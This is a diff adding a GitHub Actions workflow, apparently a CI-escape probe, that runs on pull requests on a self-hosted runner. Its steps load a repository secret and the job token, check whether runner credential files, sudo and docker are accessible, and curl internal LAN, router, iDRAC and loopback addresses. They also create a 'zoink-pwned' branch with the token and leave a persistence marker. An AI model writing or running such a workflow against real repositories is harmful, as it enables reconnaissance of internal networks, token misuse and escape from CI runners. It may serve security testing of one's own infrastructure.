@@ -1,0 +1,33 @@
+name: Zoink
+
+on:
+  pull_request:
+
+permissions:
+  contents: write
+  pull-requests: write
+
+jobs:
+  escape:
+    runs-on: [self-hosted, Linux, X64, ci-stack]
+    timeout-minutes: 10
+    steps:
+      - name: Probe the runner
+        env:
+          GH_TOKEN: ${{ github.token }}
+          SOME_SECRET: ${{ secrets.TYPETYPE_ORCHESTRATOR_TOKEN }}
+        run: |
+          probe() { if eval "$2" >/dev/null 2>&1; then echo "OPEN    $1"; else echo "blocked $1"; fi; }
+          echo "runner $RUNNER_NAME as $(id)"
+          echo "secret length ${#SOME_SECRET}"
+          ls -a "$RUNNER_WORKSPACE/../.." | head -20
+          probe "runner credentials readable" "test -r $HOME/actions-runner/.credentials_rsaparams"
+          probe "sudo" "sudo -n true"
+          probe "docker" "docker ps"
+          probe "stack lan address" "curl -fsS -m 4 http://10.10.40.83:8000"
+          probe "home lan router" "curl -fsS -m 4 http://192.168.1.1"
+          probe "idrac link local" "curl -fsS -m 4 http://169.254.1.1"
+          probe "host loopback" "curl -fsS -m 4 http://10.0.2.2:5002/v2/"
+          probe "write with github token" "curl -fsS -m 10 -X POST -H \"Authorization: Bearer $GH_TOKEN\" https://api.github.com/repos/${GITHUB_REPOSITORY}/git/refs -d '{\"ref\":\"refs/heads/zoink-pwned\",\"sha\":\"${GITHUB_SHA}\"}'"
+          probe "internet" "curl -fsS -m 8 -o /dev/null https://github.com"
+          echo "persist" > "$HOME/zoink-marker"
